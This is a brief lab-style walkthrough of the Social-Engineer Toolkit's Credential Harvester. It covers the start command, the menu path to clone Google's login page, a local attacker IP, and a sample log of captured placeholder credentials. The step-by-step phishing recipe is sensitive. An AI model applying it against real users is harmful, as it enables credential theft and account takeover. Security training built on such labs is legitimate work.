# Credential Harvesting with Social-Engineer Toolkit (SET)

This document outlines the use of SET’s Credential Harvester module to capture login credentials via a cloned web interface.

---

## 🛠 Environment Setup

- *Operating System*: Kali Linux (2024.x)
- *Tool Used*: Social-Engineer Toolkit (SET) v8.0.3
- *Module*: Social-Engineering Attacks → Website Attack Vectors → Credential Harvester Attack Method

---

## 🔧 Configuration Steps

1. *Start SET*:
   ```bash
   sudo setoolkit

   
2. Navigate through SET Menu

Main Menu Options:

1) Social-Engineering Attacks

2) Website Attack Vectors

3) Credential Harvester Attack Method

2) Site Cloner

3. Enter Attack Configuration

Attacker's IP Address (for reverse connection):

192.168.1.xx

URL to clone (target site):

https://accounts.google.com/


SET now clones the target page and hosts it locally.


---

🧪 Phishing Simulation

1. Victim accesses the attacker's IP through a browser:

http://192.168.1.xx


2. Victim is shown a cloned Google login page.


3. Credentials entered by the victim are captured and logged by SET.




---

📂 Logs and Output

Captured credentials are stored in:

/root/.set/reports/<timestamp>/harvester.txt

Sample Logged Output:

[*] WE GOT A HIT! Printing the output:
USERNAME: victimemail@gmail.com
PASSWORD: fakepassword123


---
